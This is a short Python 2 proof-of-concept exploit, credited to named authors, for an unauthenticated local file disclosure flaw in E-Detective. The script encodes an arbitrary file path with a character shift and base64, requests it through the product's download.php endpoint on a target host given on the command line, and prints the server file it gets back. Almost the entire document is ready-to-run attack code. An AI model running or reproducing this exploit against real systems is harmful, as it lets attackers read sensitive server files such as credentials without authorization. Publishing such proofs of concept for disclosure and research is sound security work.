# Proof-of-concept for unauthenticated LFD in E-Detective.
# Authors: Mustafa Al-Bassam (https://musalbas.com)
#          slipstream/RoL (https://twitter.com/TheWack0lian)

import argparse
import base64
import urllib2


def display_banner():
    print """
                              _        
                             | |       
 _ ____      ___ __   ___  __| |______ 
| '_ \ \ /\ / / '_ \ / _ \/ _` |______|
| |_) \ V  V /| | | |  __/ (_| |       
| .__/ \_/\_/ |_| |_|\___|\__,_|       
| |                                    
|_|                                    
     _      _            _   _           
    | |    | |          | | (_)          
  __| | ___| |_ ___  ___| |_ ___   _____ 
 / _` |/ _ \ __/ _ \/ __| __| \ \ / / _ \\
| (_| |  __/ ||  __/ (__| |_| |\ V /  __/
 \__,_|\___|\__\___|\___|\__|_| \_/ \___|
"""

argparser = argparse.ArgumentParser(description='Proof-of-concept for unauthenticated LFD in E-Detective.')
argparser.add_argument('hostname', help='hostname to pwn')
argparser.add_argument('file', help='path to file on server to grab')


def encode(text):
    encoded = ''

    for i in range(len(text)):
        encoded += chr(ord(text[i]) + 40)

    encoded = base64.b64encode(encoded)
    return encoded


def poc(hostname, file):
    return http_read('https://' + hostname + '/common/download.php?file=' + encode(file))


def http_read(url):
    return urllib2.urlopen(url).read()

if __name__ == "__main__":
    display_banner()
    args = argparser.parse_args()
    print poc(args.hostname, args.file)
